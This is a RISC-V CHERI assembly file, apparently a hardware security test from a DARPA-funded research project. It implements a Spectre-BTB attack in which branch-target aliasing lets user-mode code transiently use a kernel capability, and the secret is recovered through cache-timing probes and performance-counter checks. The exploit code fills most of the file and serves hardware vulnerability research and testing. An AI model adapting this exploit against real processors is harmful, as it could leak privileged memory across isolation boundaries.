/*-
 * SPDX-License-Identifier: BSD-2-Clause
 *
 * Copyright (c) 2021 Franz Fuchs
 * All rights reserved.
 *
 * This software was developed by SRI International and the University of
 * Cambridge Computer Laboratory (Department of Computer Science and
 * Technology) under DARPA contract HR0011-18-C-0016 ("ECATS"), as part of the
 * DARPA SSITH research programme.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#include "../hpm_macros.h"

.text

/*
Spectre-BTB-CHERI

The goal of the attack is to speculatively jump from
S mode to U mode. This gives an attacker the full
register state of the code operating in S mode. In
this example, the user code leaks private to M mode.
This attack is similar to the sandbox attack.

In simulation:
1st load: 0x0000000080060000
2nd load: 0x0000000080061000
*/


change_to_cap_mode:
  // set pcc flags such that capability encoding
  // mode is used
  // This is described in the CHERI Specification v7
  cspecialr ct3, pcc
  li t1, 1
  csetflags ct3, ct3, t1
#ifdef VCU_118
  li  t2, 0xc0000018
#else
  li  t2, 0x80000018
#endif
  csetoffset  ct3, ct3, t2
  cjr ct3

init_caps:

    /*
     * data capabilities
     */


#ifdef VCU_118
    // cs1 is a capability to [0xc0001000 - 0xc0002000]
    li  t2, 0xc0001000
    cfromptr cs1, ddc, t2
    li t1, 0x1000
    csetbounds cs1, cs1, t1

    // ct6 is a capability to [0xc0002000 - 0xc0003000]
    li  t2, 0xc0002000
    cfromptr ct6, ddc, t2
    li t1, 0x1000
    csetbounds ct6, ct6, t1
    // store value at 0(ct6)
    li t1, 0x200
    csd t1, 0(ct6)
#else
    // cs1 is a capability to [0x80001000 - 0x80002000]
    li  t2, 0x80001000
    cfromptr cs1, ddc, t2
    li t1, 0x1000
    csetbounds cs1, cs1, t1

    // ct6 is a capability to [0x80002000 - 0x80003000]
    li  t2, 0x80002000
    cfromptr ct6, ddc, t2
    li t1, 0x1000
    csetbounds ct6, ct6, t1
    // store value at 0(ct6)
    li t1, 0x200
    csd t1, 0(ct6)
#endif

    /*
     * code capabilities
     */

    // PCC for flush function
    cllc cs4, flush
    li t1, 0x100
    csetbounds cs4, cs4, t1

    // PCC for user code jump
    cllc cs5, user_funct_cont
    li t1, 0x100
    csetbounds cs5, cs5, t1


    // PCC for kernel code jump
    cllc ct1, kernel_funct_cont
    li t2, 0x100
    csetbounds ct1, ct1, t2
    // store at 0(cs1)
    csc ct1, 0(cs1)

    // PCC to trap_handler
    cllc cs7, trap_handler

init_hpm:
    // prepare hardware performance monitoring
    // do counting of load request sent by the CPU
    HPM_SELECT_EVENT(3, 0x30)
    // enable reading from S and U mode
    HPM_M_ENABLE_X(3)
    HPM_S_ENABLE_X(3)
    HPM_M_UN_INHIBIT_X(3)
    HPM_M_READ_X(s10, 3)
    cld s9, 0(cs1)
    HPM_M_READ_X(s10, 3)

init_exceps:

    // enable interrupts for all privilege levels
    // MIE = 1, SIE = 1, UIE = 1
    li t2, 0xb
    csrs mstatus, t2

    // delegate ecalls to S mode
    // ecalls are set with bit 8
    li t2, 256
    csrw medeleg, t2

// changes to S mode
change_to_s_mode:

    // set MPP such that we return to S mode
    li x6, 0x00001000
    csrc mstatus, x6
    li x6, 0x00000800
    csrs mstatus, x6

    // store perform_s_mode_action address in mepcc
    cllc ct0, perform_s_mode_action
    cspecialw mepcc, ct0

    mret

// initialises trap vector
perform_s_mode_action:

    // stvec mode: direct (value 0 as RISC-V instructions are
    // aligned on 2 byte boundaries)
    // stvec base address: kernel_funct
    cllc ct2, kernel_funct
    li t1, 0x10000
    csetbounds ct2, ct2, t1
    cspecialw stcc, ct2 


change_to_u_mode:

    // set SPP such that we return to U mode
    li x6, 0x00000100
    csrc sstatus, x6

    // store user_funct address in mepcc
    cllc ct0, user_funct
    li t1, 0x10000
    csetbounds ct0, ct0, t1
    cspecialw sepcc, ct0

    // jump to user code
    sret

trap_handler:
    HPM_SU_READ_X (s11, 3)

probe:
#ifdef VCU_118
    li  t2, 0xc0060e00
    li  t3, 0xc0070000
#else
    li  t2, 0x80060e00
    li  t3, 0x80070000
#endif
    cfromptr ct2, ddc, t2
    cfromptr ct6, ddc, t3
    add t4, x0, x0
    addi t5, x0, 16
probe_loop:
    rdcycle t0
    cld t3, 0(ct2)
    rdcycle t1
    sub t1, t1, t0
    csd t1, 0(ct6)
    cincoffsetimm ct6, ct6, 8
    cincoffsetimm ct2, ct2, 64
    addi t4, t4, 1
    blt t4, t5, probe_loop
    nop
    nop

    // we expect 257 + 4 loads to have happened
    // 257 loads for flushing the caches
    // two architectural loads in user_funct_cont
    // one architectural load in kernel_funct_start
    // two transient loads in user_funct_cont, where
    // the latter one leaks the secret (the first transient
    // load is not counted because it is served from a store
    // buffer)
    HPM_CAP_TEST(s10, s11,261)



flush:
    // flush entire cache
    
    // use ddc for that
    // set to memory address not used by
    // other sections
#ifdef VCU_118
    li t2, 0xc0100000
#else
    li t2, 0x80100000
#endif
    li t3, 0x80000
    add t3, t2, t3
    cfromptr ct1, ddc, t2
flush_loop:
    cld t0, 0(ct1)
    li a6, 2048
    cincoffset ct1, ct1, a6
    cgetaddr t0, ct1
    ble t0, t3, flush_loop

    // fence instruction
    fence rw, rw
    cret

/*
 * kernel code
 *
 * running in S priviledge mode
 */

.section .kernel_btb_s , "ax"

kernel_funct:
    // jump to start function
    // done this way in order to always have the same
    // start address, which gives makes it easier to
    // alias the right BTB entry
    j kernel_funct_start

    .rept 0x40
    .byte 0x00
    .endr

kernel_funct_start:
    // generate a powerful capability
#ifdef VCU_118
    li t2, 0xc0060000
#else
    li t2, 0x80060000
#endif
    li t3, 0x10000
    li t4, 0x1000
    add t3, t2, t3
    cfromptr ct6, ddc, t2
    csd t4, 0(ct6)
    
    // jump to kernel_funct_cont
    clc ct1, 0(cs1)
    // this jump will be aliased and MUST NOT be
    // moved around. If moved around, the corresponding
    // jump in the user code must be adjusted as well
    cjr ct1

    .rept 0x40
    .byte 0x00
    .endr

kernel_funct_cont:
    // content of ct6 shall not be visible to anyone else
    cmove ct6, cnull
    // do hpm measurements
    cjr cs7



/*
 * user code
 *
 * running in U priviledge mode
 */

.section .kernel_btb_u , "ax"

user_funct:
    // done this way in order to always have the same
    // start address, which gives makes it easier to
    // alias the right BTB entry
    j user_funct_start

    .rept 0xa4e
    .byte 0x00
    .endr

user_funct_start:
    // read value of counter 3 and store it to s10
    HPM_SU_READ_X (s10, 3)

    // flush caches
    cjalr cra, cs4

    // jump to continued code
    // this jump will be used for aliasing and MUST NOT be
    // moved around. If moved around, the corresponding
    // jump in the kernel code must be adjusted as well
    cjr cs5

    .rept 0x40
    .byte 0x00
    .endr

user_funct_cont:
    // load from ct6
    cld t5, 0(ct6)
    cincoffset ct5, ct6, t5
    cld t5, 0(ct5)
    // call kernel_funct
    ecall
// infinite loop
user_funct_loop:
    add t1, x0, x0
    beq t1, x0, user_funct_loop

.section .tohost , "adw"

tohost:
  .dword 0x0000000000000000
